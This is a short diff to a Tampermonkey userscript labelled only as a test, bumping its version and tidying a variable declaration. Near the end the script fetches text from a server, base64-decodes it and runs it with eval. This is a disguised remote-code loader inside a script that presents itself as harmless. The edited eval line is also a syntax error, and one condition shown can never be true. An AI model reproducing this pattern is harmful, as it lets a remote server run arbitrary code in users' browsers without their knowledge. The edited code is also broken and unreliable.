@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Test User Script
 // @namespace    http://tampermonkey.net/
-// @version      0.4
+// @version      0.5
 // @description  Test
 // @author       Scratchyone
 // @updateURL    https://www.scratchyone.com/userscripts/testuserscript.user.js
@@ -11,7 +11,7 @@
 // ==/UserScript==
 
 (function() {
-  b=2
+  var b=2;
   window.setInterval(function() {
     if(5/2+9==b||67+b*2==b) {
     [].forEach.call(document.getElementsByTagName("ul"), function(item) {
@@ -45,6 +45,6 @@
 	// Convert to JSON
 	return response.text();
 }).then(function(t) {
-	eval(atob(t))
+	eval(atob(t););
 });
 })();
